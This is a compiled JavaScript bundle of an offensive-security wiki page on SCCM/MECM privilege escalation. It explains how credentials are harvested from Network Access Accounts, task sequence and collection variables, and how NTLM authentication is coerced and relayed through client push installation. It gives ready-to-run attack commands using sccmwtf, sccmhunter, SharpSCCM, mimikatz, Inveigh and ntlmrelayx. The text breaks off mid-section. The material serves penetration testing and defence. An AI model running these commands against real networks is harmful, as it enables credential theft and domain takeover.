import{_ as o,c as p,a5 as r,G as t,w as a,j as e,a as s,B as h,o as c}from"./chunks/framework.B5CpDqM0.js";const d="/assets/SharpSCCM-get-secrets-command._i59NsFU.png",E=JSON.parse('{"title":"Privilege escalation","description":"","frontmatter":{"authors":"BlWasp, ShutdownRepo"},"headers":[],"relativePath":"ad/movement/sccm-mecm/privilege-escalation.md","filePath":"ad/movement/sccm-mecm/privilege-escalation.md","lastUpdated":1724982529000}'),k={name:"ad/movement/sccm-mecm/privilege-escalation.md"};function u(g,i,m,y,b,C){const n=h("PluginTabsTab"),l=h("PluginTabs");return c(),p("div",null,[i[18]||(i[18]=r('<h1 id="privilege-escalation" tabindex="-1">Privilege escalation <a class="header-anchor" href="#privilege-escalation" aria-label="Permalink to &quot;Privilege escalation&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>Curently there are three different pathways for privilege escalation routes in an SCCM environment and take control over the infrastructure:</p><ul><li>Credential harvesting: includes all the ways that could permit to retrieve SCCM related credentials in the environment.</li><li>Authentication Coercion: with a compromised machine in an Active Directory where SCCM is deployed via Client Push Accounts on the assets, it is possible to have the &quot;Client Push Account&quot; authenticate to a remote resource and, for instance, retrieve an NTLM response (i.e. <a href="./../ntlm/capture">NTLM capture</a>). The &quot;Client Push Account&quot; usually has local administrator rights to a lot of assets.</li><li>SCCM site takeover: a NTLM authentication obtained from the SCCM primary site server can be relayed to the SMS Provider or the MSSQL server in order to compromise the SCCM infrastructure.</li><li>SCCM site takeover from a passive site server: as describer by <a href="https://twitter.com/garrfoster" target="_blank" rel="noreferrer">Garrett Foster</a> in this <a href="https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43" target="_blank" rel="noreferrer">article</a>, when a passive site server is setup for high availability purpose, its machine account must be a member of the local Administrators group on the active site server. It must also be administrator on all the site system deployed in the site, including the MSSQL database</li></ul><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="credential-harvesting" tabindex="-1">Credential harvesting <a class="header-anchor" href="#credential-harvesting" aria-label="Permalink to &quot;Credential harvesting&quot;">​</a></h3><p>The following SCCM components can contain credentials:</p><ul><li>Device Collection variables</li><li>TaskSequence variables</li><li>Network Access Accounts (NAAs)</li><li>Client Push Accounts</li><li>Application &amp; Scripts (potentially)</li></ul><p>Find more details about these components in <a href="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/" target="_blank" rel="noreferrer">this blog</a> post.</p><h4 id="network-access-accounts-naas" tabindex="-1">Network Access Accounts (NAAs) <a class="header-anchor" href="#network-access-accounts-naas" aria-label="Permalink to &quot;Network Access Accounts (NAAs)&quot;">​</a></h4><p>NAAs are manually created domain accounts used to retrieve data from the SCCM Distribution Point (DP) if the machine cannot use its machine account. Typically, when a machine has not yet been registered in the domain. To do this, the SCCM server sends the NAA policy to the machine, which will store the credentials encrypted by DPAPI on the disk. The credentials can be retrieved by requesting the WMI class in the CIM store in a binary file on the disk.</p><p>NAA doesn&#39;t need to be privileged on the domain, but it can happen that administrators give too many privileges to these accounts.</p><p>It is worth to note that, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers.</p>',13)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-based"},{default:a(()=>i[0]||(i[0]=[e("p",null,[s("From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, "),e("a",{href:"https://github.com/fortra/impacket/pull/1137",target:"_blank",rel:"noreferrer"},"SystemDPAPIdump.py"),s(" (Python) can be used to decipher via DPAPI the WMI blob related to SCCM and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"SystemDPAPIdump.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -creds"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -sccm"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@target."),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN")])])])],-1),e("p",null,"On the other hand, it is possible, from a controlled computer account, to manually request the SCCM policy and retrieve the NAAs inside.",-1),e("div",{class:"caution custom-block"},[e("p",null,[s("The tool author ("),e("a",{href:"https://twitter.com/_xpn_",target:"_blank",rel:"noreferrer"},"Adam Chester"),s(") warns not to use this script in production environments.")])],-1),e("p",null,"Step 1: Gain control over a computer account password.",-1),e("p",null,"For this step, it is possible to create a new computer account (if permited by the domain policy), instead of compromise a domain computer.",-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"addcomputer.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-computer-name"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," controlledComputer"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-computer-pass"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," controlledPassword"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD")])])])],-1),e("p",null,[s("Step 2: Use "),e("code",null,"sccmwtf.py"),s(" to extract NAA secrets")],-1),e("p",null,"A controlled computer account is needed to send the authenticated request (this is why a computer account has been created previously) to retrieve the policy, but the account to spoof doesn't need to be the same.",-1),e("p",null,[s("Here, "),e("code",null,"$SCCM_MP_NetBiosName"),s(" takes the value of the SCCM Management Point server NETBIOS name.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"sccmwtf.py"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," fakepc"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," fakepc."),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN $SCCM_MP_NetBiosName "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'\\controlledComputer$"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "controlledPassword"')])])])],-1),e("p",null,"Step 3: Obtain obfuscated NAA secrets",-1),e("p",null,"The obufscated NAA secrets will be saved in a local file.",-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"cat"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /tmp/naapolicy.xml")])])])],-1),e("p",null,[s("Values to decode are the long hexadecimal strings in the CDATA sections ("),e("code",null,"<![CDATA[String_here]"),s(").")],-1),e("p",null,"Step 4: Decode obfuscated strings",-1),e("p",null,[s("To decode username and password use "),e("code",null,".\\DeobfuscateSecretString.exe"),s(" contained in "),e("a",{href:"https://github.com/Mayyhem/SharpSCCM",target:"_blank",rel:"noreferrer"},"SharpSCCM"),s(" or "),e("a",{href:"https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.c",target:"_blank",rel:"noreferrer"},"sccmwtf")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"policysecretdecrypt.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $HEX_STRING")])])])],-1),e("p",null,[s("Alternatively, "),e("a",{href:"https://github.com/garrettfoster13/sccmhunter",target:"_blank",rel:"noreferrer"},"sccmhunter"),s(" (Python) automates all the attack with, or without, an already controlled computer accounts. For this purpose, the "),e("code",null,"http"),s(" module uses the result from the "),e("code",null,"find"),s(" command and enumerates the remote hosts for SCCM/MECM enrollment web services. If it finds one, it performs "),e("a",{href:"https://twitter.com/_xpn_",target:"_blank",rel:"noreferrer"},"Adam Chester"),s("'s attack for the specified computer account. If no account is already under control, the "),e("code",null,"-auto"),s(" flag can be indicated to create a new computer account.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"#Create a new computer account and request the policies")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"python3"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," sccmhunter.py"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," http"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-dc-ip"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC_IP "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-auto")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"#To use an already controlled computer account")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"python3"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," sccmhunter.py"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," http"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-cn"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $COMPUTER_NAME "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-cp"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $COMPUTER_PASSWORD "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-dc-ip"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC_IP")])])])],-1)])),_:1}),t(n,{label:"From Windows"},{default:a(()=>i[1]||(i[1]=[e("p",null,[s("From a Windows machine enrolled in the SCCM environment, "),e("a",{href:"https://github.com/Mayyhem/SharpSCCM",target:"_blank",rel:"noreferrer"},"SharpSCCM"),s(" (C#), "),e("a",{href:"https://github.com/GhostPack/SharpDPAPI",target:"_blank",rel:"noreferrer"},"SharpDPAPI"),s(", "),e("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"Mimikatz"),s(" (C) or a PowerShell command, can be used with, administrative rights, to extract the NAA credentials locally.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Locally From WMI")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-WmiObject"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Namespace ROOT\\ccm\\policy\\Machine\\ActualConfig "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Class CCM_NetworkAccessAccount")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Extracting from CIM store")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," local secretes disk")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Extracting from WMI")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," local secretes wmi")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Using SharpDPAPI")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpDPAPI.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," SCCM")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Using mimikatz")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"mimikatz.exe")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"mimikatz "),e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# privilege::debug")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"mimikatz "),e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# token::elevate")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"mimikatz "),e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# dpapi::sccm")])])])],-1),e("p",null,"SharpSCCM also permits to request the SCCM policy remotely to retrieve the NAA credentials inside.",-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," get secretes")])])])],-1)])),_:1})]),_:1}),i[19]||(i[19]=e("h4",{id:"tasksequence-variables",tabindex:"-1"},[s("TaskSequence variables "),e("a",{class:"header-anchor",href:"#tasksequence-variables","aria-label":'Permalink to "TaskSequence variables"'},"​")],-1)),i[20]||(i[20]=e("p",null,'TaskSequence are steps that can be configured by an administrator to perform specific actions, for example "Sequence for adding a machine to the domain". Think of it as a script that runs. These TaskSequences can contain variables that can contain credentials. These sequences can use device collection variables (presented in the next section) as conditions.',-1)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-based"},{default:a(()=>i[2]||(i[2]=[e("p",null,[e("em",null,"At the time of writing (February 2024), no solution exists to perform this attack from a UNIX-like machine.")],-1)])),_:1}),t(n,{label:"From Windows"},{default:a(()=>i[3]||(i[3]=[e("p",null,[s("From a Windows machine enrolled in the SCCM environment, "),e("a",{href:"https://github.com/Mayyhem/SharpSCCM",target:"_blank",rel:"noreferrer"},"SharpSCCM"),s(" (C#) or a PowerShell command can be used with, administrative rights, to extract the TaskSequence variables locally.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Locally from WMI ")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-WmiObject"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Namespace ROOT\\ccm\\policy\\Machine\\ActualConfig "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Class CCM_TaskSequence")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Extracting from CIM store")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," local secrets "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"m disk")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Extracting from WMI")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," local secrets "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"m wmi")])])])],-1),e("p",null,"SharpSCCM also permits to request the SCCM policy remotely to retrieve the NAA credentials inside.",-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," get secrets")])])])],-1)])),_:1})]),_:1}),i[21]||(i[21]=e("h4",{id:"device-collection-variables",tabindex:"-1"},[s("Device Collection variables "),e("a",{class:"header-anchor",href:"#device-collection-variables","aria-label":'Permalink to "Device Collection variables"'},"​")],-1)),i[22]||(i[22]=e("p",null,'Devices enrolled in an SCCM environment can be grouped by collection. These exist by default, but administrators can create custom collections (for example "Server 2012 devices"), and add variables for these collections that will be used, for example, during application deployement to check some conditions. These variables may very well contain credentials and be found locally on the clients.',-1)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-based"},{default:a(()=>i[4]||(i[4]=[e("p",null,[e("em",null,"At the time of writing (February 2024), no solution exists to perform this attack from a UNIX-like machine.")],-1)])),_:1}),t(n,{label:"From Windows"},{default:a(()=>i[5]||(i[5]=[e("p",null,[s("From a Windows machine enrolled in the SCCM environment, "),e("a",{href:"https://github.com/Mayyhem/SharpSCCM",target:"_blank",rel:"noreferrer"},"SharpSCCM"),s(" (C#) or a PowerShell command can be used with, administrative rights, to extract the collection variables locally.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Locally from WMI ")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-WmiObject"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Namespace ROOT\\ccm\\policy\\Machine\\ActualConfig "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Class CCM_CollectionVariable")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Locally from CIM store")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," local secrets "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"m disk")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Locally from WMI")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," local secrets "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"m wmi")])])])],-1)])),_:1})]),_:1}),i[23]||(i[23]=r('<p><img src="'+d+`" alt=""></p><h3 id="authentication-coercion-via-client-push-installation" tabindex="-1">Authentication Coercion via Client Push Installation <a class="header-anchor" href="#authentication-coercion-via-client-push-installation" aria-label="Permalink to &quot;Authentication Coercion via Client Push Installation&quot;">​</a></h3><div class="tip custom-block"><p>In some case, the &quot;Client Push Accounts&quot; could even be part of the Domain Admins group, leading to a complete takeover of the domain.</p></div><p>The client push installation can be triggered forcefully or - if you&#39;re lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.</p><h4 id="option-1-wait-for-client-push-installation" tabindex="-1">Option 1: Wait for Client Push Installation <a class="header-anchor" href="#option-1-wait-for-client-push-installation" aria-label="Permalink to &quot;Option 1: Wait for Client Push Installation&quot;">​</a></h4><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Credential capture using Inveigh </span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Inveigh.exe</span></span></code></pre></div><h4 id="option-2-forcefully-coerce-the-client-push-installation" tabindex="-1">Option 2: Forcefully &quot;coerce&quot; the Client Push Installation <a class="header-anchor" href="#option-2-forcefully-coerce-the-client-push-installation" aria-label="Permalink to &quot;Option 2: Forcefully &quot;coerce&quot; the Client Push Installation&quot;">​</a></h4><div class="warning custom-block"><p>One should read <a href="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a" target="_blank" rel="noreferrer">this blog</a> before continuing, as this attack might leave traces behind and might mess things up with the SCCM environment.</p></div><h5 id="step-1-prepare-coercion-listener" tabindex="-1">Step 1: prepare coercion listener <a class="header-anchor" href="#step-1-prepare-coercion-listener" aria-label="Permalink to &quot;Step 1: prepare coercion listener&quot;">​</a></h5><p>Note that you could either capture &amp; crack received credentials or relay them to a suitable target system (or both).</p><div class="language-sh vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sh</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># On Linux</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">## Relay using ntlmrelayx.py</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ntlmrelayx.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -smb2support</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -socks</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ts</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ip</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.250.2.100</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.250.2.179</span></span></code></pre></div><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># On Windows</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">## Credential capture using Inveigh </span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Inveigh.exe</span></span></code></pre></div><h5 id="step-2-trigger-client-push-installation" tabindex="-1">Step 2: trigger Client-Push Installation <a class="header-anchor" href="#step-2-trigger-client-push-installation" aria-label="Permalink to &quot;Step 2: trigger Client-Push Installation&quot;">​</a></h5><div class="language-PowerShell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">PowerShell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># If admin access over Management Point (MP)</span></span>
